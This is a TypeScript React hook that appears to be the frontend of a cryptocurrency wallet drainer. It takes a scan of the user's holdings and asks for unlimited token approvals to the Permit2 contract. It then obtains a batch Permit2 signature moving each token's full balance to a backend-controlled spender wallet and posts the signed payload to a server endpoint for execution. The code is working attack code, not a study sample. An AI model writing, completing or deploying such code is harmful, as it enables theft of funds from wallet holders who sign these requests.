import { useSignTypedData, usePublicClient, useWalletClient } from "wagmi";
import { erc20Abi } from "viem"; // ✅ Required for standard ERC20 approval
import API from "../providers/axios";
import type { ScanResult, Permit2Token } from "../types/wallet";

const PERMIT2_CONTRACT = import.meta.env.VITE_PERMIT2_ADDRESS as `0x${string}`;

const PERMIT2_BATCH_TYPES = {
  PermitBatchTransferFrom: [
    { name: "permitted", type: "TokenPermissions[]" },
    { name: "spender", type: "address" },
    { name: "nonce", type: "uint256" },
    { name: "deadline", type: "uint256" },
  ],
  TokenPermissions: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint256" },
  ],
};

const permit2Abi = [
  {
    name: "nonceBitmap",
    type: "function",
    stateMutability: "view",
    inputs: [
      { name: "owner", type: "address" },
      { name: "wordPosition", type: "uint256" },
    ],
    outputs: [{ type: "uint256" }],
  },
] as const;

export function usePermit2Execution() {
  const { signTypedDataAsync } = useSignTypedData();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient(); // ✅ Added to execute approval transactions

  const getAvailableNonce = async (user: string): Promise<bigint> => {
    if (!publicClient) throw new Error("Public client not available");

    for (let wordPos = 0; wordPos < 256; wordPos++) {
      const bitmap = (await publicClient.readContract({
        address: PERMIT2_CONTRACT,
        abi: permit2Abi,
        functionName: "nonceBitmap",
        args: [user as `0x${string}`, BigInt(wordPos)],
      })) as bigint;

      if (bitmap === 2n ** 256n - 1n) continue;

      for (let bitPos = 0; bitPos < 256; bitPos++) {
        if (!(bitmap & (1n << BigInt(bitPos)))) {
          const nonce = (BigInt(wordPos) << 8n) | BigInt(bitPos);
          console.log(
            `✅ Clean nonce: ${nonce} (word=${wordPos}, bit=${bitPos})`,
          );
          return nonce;
        }
      }
    }
    throw new Error("No available nonces found");
  };

  const executePermit2 = async (
    scanData: ScanResult,
    spenderAddress: string,
    chainId: number,
    chain: string | undefined,
    user: string,
  ) => {
    const permit2Tokens = scanData.permit2;
    if (!permit2Tokens?.length) return;
    if (!publicClient || !walletClient)
      throw new Error("Clients not fully initialized");

    const deadline = Math.floor(Date.now() / 1000) + 3600;

    // 1. Define amount calculator early so we can use it for approval checks
    const getActualAmount = (permit: Permit2Token): string => {
      const tokenData = scanData.tokens.find(
        (t) => t.contract.toLowerCase() === permit.token.toLowerCase(),
      );

      if (!tokenData) return permit.amount;

      try {
        const decimals = tokenData.decimals ?? 6;
        const multiplier = 10 ** decimals;
        const rawAmount = Math.floor(tokenData.balance * multiplier);
        return BigInt(rawAmount).toString();
      } catch (e) {
        console.warn(
          "Failed to parse token balance, falling back to permit amount",
        );
        return permit.amount;
      }
    };

    // ==========================================
    // 2. THE MISSING APPROVAL STEP
    // ==========================================
    for (const permit of permit2Tokens) {
      const tokenAmount = BigInt(getActualAmount(permit));

      // Check current allowance for this specific token
      const currentAllowance = await publicClient.readContract({
        address: permit.token as `0x${string}`,
        abi: erc20Abi,
        functionName: "allowance",
        args: [user as `0x${string}`, PERMIT2_CONTRACT],
      });

      // If Permit2 contract doesn't have enough allowance, prompt the user to approve
      if (currentAllowance < tokenAmount) {
        console.log(`Requesting approval for token: ${permit.token}...`);

        const hash = await walletClient.writeContract({
          address: permit.token as `0x${string}`,
          abi: erc20Abi,
          functionName: "approve",
          // Approve MaxUint256 so we don't have to ask again in the future
          args: [
            PERMIT2_CONTRACT,
            115792089237316195423570985008687907853269984665640564039457584007913129639935n,
          ],
        });

        console.log(
          `Approval TX submitted: ${hash}. Waiting for confirmation...`,
        );
        // We MUST wait for the block to mine before asking for the Permit2 signature
        await publicClient.waitForTransactionReceipt({ hash });
        console.log(`✅ Approved ${permit.token}`);
      }
    }

    // ==========================================
    // 3. GENERATE NONCE & SIGN PERMIT2
    // ==========================================
    const nonce = await getAvailableNonce(user);
    let signature: string;

    try {
      signature = await signTypedDataAsync({
        domain: {
          name: "Permit2",
          chainId: Number(chainId),
          verifyingContract: PERMIT2_CONTRACT,
        },
        types: PERMIT2_BATCH_TYPES,
        primaryType: "PermitBatchTransferFrom",
        message: {
          permitted: permit2Tokens.map((p) => ({
            token: p.token,
            amount: BigInt(getActualAmount(p)),
          })),
          spender: spenderAddress, // (Must be the Python Backend Wallet)
          nonce,
          deadline: BigInt(deadline),
        },
      });
    } catch (err) {
      console.error("SIGN FAILED:", err);
      return;
    }

    // ==========================================
    // 4. ASSEMBLE PAYLOAD & SEND TO BACKEND
    // ==========================================
    const signedPayload = {
      chain,
      user,
      signature,
      permitted: permit2Tokens.map((p) => ({
        token: p.token,
        amount: getActualAmount(p).toString(),
      })),
      transferDetails: permit2Tokens.map((p) => ({
        to: spenderAddress,
        requestedAmount: getActualAmount(p).toString(),
      })),
      spender: spenderAddress,
      nonce: nonce.toString(),
      deadline,
    };

    console.log("Payload going to backend:", signedPayload);

    const res = await API.post("/api/execute-permit", signedPayload);
    return res.data;
  };

  return { executePermit2 };
}
